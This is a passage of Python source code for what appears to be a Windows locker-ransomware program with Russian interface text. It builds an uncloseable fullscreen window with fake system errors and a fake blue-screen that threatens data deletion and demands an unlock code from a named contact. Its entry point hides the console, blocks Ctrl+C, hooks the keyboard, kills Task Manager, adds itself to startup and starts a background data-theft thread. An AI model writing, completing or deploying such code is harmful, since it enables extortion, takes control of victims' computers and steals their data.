⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⢸⣿⡿⠿⠛⠛⠉⠉⠉⠉⠉⠉⠉⠛⠛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀
"""

# ============= ОСНОВНОЙ ЭКРАН =============
def show_eye_screen():
    """Показывает глаз 3 секунды, затем убирает и показывает человека + ошибки"""
    
    # Запускаем защиту от завершения работы системы
    threading.Thread(target=prevent_shutdown, daemon=True).start()
    
    # Создаём главное окно
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.configure(bg='black')
    root.protocol("WM_DELETE_WINDOW", lambda: None)  # Запрет закрытия через крестик
    
    # ===== ЭТАП 1: ГЛАЗ =====
    eye_frame = tk.Frame(root, bg='black')
    eye_frame.place(relx=0.5, rely=0.5, anchor='center')
    
    eye_label = tk.Label(
        eye_frame,
        text=EYE_ASCII,
        font=("Consolas", 9),
        fg="#00ff88",
        bg="black",
        justify="center"
    )
    eye_label.pack()
    
    text_label = tk.Label(
        eye_frame,
        text="ВАС ЗАМЕТИЛИ",
        font=("Consolas", 24, "bold"),
        fg="#ff0000",
        bg="black"
    )
    text_label.pack(pady=20)
    
    # Через 3 секунды убираем глаз и показываем человека + ошибки
    def show_man_and_errors():
        eye_frame.destroy()
        
        # ===== ЭТАП 2: КРАСНЫЙ ЧЕЛОВЕК СПРАВА =====
        man_frame = tk.Frame(root, bg='black')
        man_frame.place(relx=0.72, rely=0.50, anchor='center')
        
        man_label = tk.Label(
            man_frame,
            text=MAN_ASCII,
            font=("Consolas", 7),
            fg="#ff0000",
            bg="black",
            justify="center"
        )
        man_label.pack()
        
        # ===== ЭТАП 3: ОШИБКИ СЛЕВА ОТ ЧЕЛОВЕКА (БЕЗ АНИМАЦИИ) =====
        error_frame = tk.Frame(root, bg='black')
        error_frame.place(relx=0.08, rely=0.20, anchor='nw')
        
        error_messages = [
            "[CRITICAL] 0x0000DEAD: ACCESS DENIED",
            "[SYSTEM] 0x0BADF00D: SESSION ENCRYPTION FAIL",
            "[MEMORY] 0xDEADBEEF: LEAK DETECTED",
            "[DRIVER] 0x0000007E: CRITICAL FAILURE",
            "[DISK] 0x0F00D: SECTOR READ ERROR",
            "[REGISTRY] 0xC000021A: CORRUPTION",
            "[HARDWARE] 0x00000050: FATAL ERROR",
            "[KERNEL] 0x0000001A: MEMORY MANAGEMENT",
            "[SECURITY] 0xC0000005: ACCESS VIOLATION",
            "[SYSTEM] 0x00000077: KERNEL STACK INPAGE ERROR",
        ]
        
        error_labels = []
        
        def show_errors_one_by_one(index=0):
            if index >= len(error_messages):
                # Все ошибки показаны → через 3 секунды BSOD
                root.after(3000, lambda: show_bsod(root))
                return
            
            lbl = tk.Label(
                error_frame,
                text=error_messages[index],
                font=("Consolas", 14, "bold"),
                fg="red",
                bg="black"
            )
            lbl.pack(anchor='w', pady=4)
            error_labels.append(lbl)
            
            # Следующая ошибка через 400 мс
            root.after(400, lambda: show_errors_one_by_one(index+1))
        
        # Запускаем показ ошибок
        root.after(300, lambda: show_errors_one_by_one(0))
    
    # Запускаем таймер на 3 секунды
    root.after(3000, show_man_and_errors)
    
    root.mainloop()

def show_bsod(root):
    """Чёрный BSOD с текстом и полем для ввода кода"""
    root.destroy()
    
    bsod_root = tk.Tk()
    bsod_root.attributes('-fullscreen', True)
    bsod_root.attributes('-topmost', True)
    bsod_root.configure(bg='black')
    bsod_root.protocol("WM_DELETE_WINDOW", lambda: None)  # Запрет закрытия

    lines = [
        "БРАТАН, ТВОЙ КОМП ПОЛУЧИЛ ПИЗДЫ.",
        "МЫ УЖЕ СОБИРАЕМ ТВОИ ДАННЫЕ, И СКОРО ИХ УДАЛИМ НАВСЕГДА.",
        "НИЧЕГО НЕ БОЙСЯ, ЭТО ПРОСТО КОНЕЦ.",
        "",
        "Код ошибки: СМЕРТЬ_ТВОЕГО_ЖЕСТКОГО_ДИСКА",
        "",
        "Что сломалось: твоя операционка - адрес 0xDEADBEEF",
        "",
        "Для получения дополнительной информации ищи свои файлы в корзине"
    ]

    tk.Label(
        bsod_root,
        text="\n".join(lines),
        font=("Consolas", 16, "bold"),
        fg="white",
        bg="black",
        justify="left"
    ).pack(expand=True, pady=20)

    progress_label = tk.Label(
        bsod_root,
        text="0% complete",
        font=("Consolas", 14, "bold"),
        fg="white",
        bg="black"
    )
    progress_label.pack(pady=10)

    def show_recovery_input():
        progress_label.pack_forget()
        tk.Label(
            bsod_root,
            text="Введите код для возврата всех данных (получить в @isrealplayer):",
            font=("Consolas", 14, "bold"),
            fg="white",
            bg="black"
        ).pack(pady=10)
        entry = tk.Entry(
            bsod_root,
            font=("Consolas", 14),
            bg="white",
            fg="black",
            justify="center"
        )
        entry.pack(pady=5)
        entry.focus_set()
        error_label = tk.Label(
            bsod_root,
            text="",
            font=("Consolas", 12),
            fg="red",
            bg="black"
        )
        error_label.pack(pady=5)

        def check_code():
            code = entry.get().strip()
            if code == "67":
                create_marker()
                remove_from_startup()
                bsod_root.destroy()
            else:
                error_label.config(text="Неверный код! Попробуйте снова.")
                entry.delete(0, tk.END)
                entry.focus_set()

        tk.Button(
            bsod_root,
            text="Восстановить",
            font=("Consolas", 12, "bold"),
            bg="white",
            fg="black",
            command=check_code
        ).pack(pady=10)
        bsod_root.bind('<Return>', lambda event: check_code())

    def update_progress(pct=0):
        if pct <= 100:
            progress_label.config(text=f"{pct}% complete")
            bsod_root.after(80, update_progress, pct + 1)
        else:
            progress_label.config(text="100% complete – restarting...")
            bsod_root.after(500, show_recovery_input)

    bsod_root.after(100, update_progress)
    bsod_root.mainloop()

# =================== ТОЧКА ВХОДА ===================
if __name__ == "__main__":
    # === Защита терминала и немедленная блокировка клавиш ===
    hide_console()               # скрываем консольное окно
    set_console_handler()        # игнорируем Ctrl+C и закрытие консоли
    threading.Thread(target=start_key_hook, daemon=True).start()  # глобальный перехват клавиш с самого старта

    # Проверка маркера (если код разблокировки уже введён)
    if marker_exists():
        sys.exit(0)

    # Закрываем диспетчер задач, чтобы пользователь не мог его открыть
    kill_task_manager()

    # Добавляем скрипт в автозагрузку через папку Startup (создаём BAT-файл)
    add_to_startup()

    # Запускаем кражу данных в фоне
    threading.Thread(target=steal_and_send, daemon=True).start()

    # Немедленно запускаем лочер (глаз + BSOD)
    show_eye_screen()